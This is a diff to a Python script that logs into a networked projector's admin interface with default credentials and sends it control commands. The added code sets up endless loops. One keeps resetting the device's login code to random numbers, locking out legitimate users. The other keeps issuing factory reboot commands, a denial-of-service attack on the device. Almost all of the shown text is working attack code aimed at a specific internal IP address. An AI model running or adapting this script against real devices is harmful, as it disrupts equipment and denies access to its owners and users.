@@ -11,6 +11,7 @@
 #-------------------------------------------------------------------------------------
 
 import requests
+import random
 
 print("Trying to login now")
 
@@ -19,7 +20,7 @@ username="admin"
 password="admin"
 
 #Target
-host="10.103.36.87"
+host="10.103.36.169"
 
 #URL of Projector
 url="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"
@@ -43,7 +44,7 @@ cookieMid=cookieStart[1].split("'")
 cookie=cookieMid[0]
 print(cookie)
 
-action="Reboot"
+action="BootCycle"
 if action == "Remote":
     #Turn Remove View Off
     url = "https://"+ host + "/cgi-bin/return.cgi"
@@ -67,3 +68,19 @@ elif action == "Web":
     }
     remoteViewOn = requests.post(url=url,data=data, verify=False)
     print("Web Request Sent")
+elif action == "CodeCycle":
+    while True:
+            randomInt = random.randint(1,9999)
+            url = "https://"+ host + "/cgi-bin/return.cgi"
+            data = {
+                'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
+            }
+            remoteViewOn = requests.post(url=url,data=data, verify=False)
+            print("Cycle")
+elif action == "BootCycle":
+    while True:
+            url = "https://"+ host + "/cgi-bin/return.cgi"
+            data = {
+               "command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
+            }
+            remoteViewOn = requests.post(url=url,data=data, verify=False)
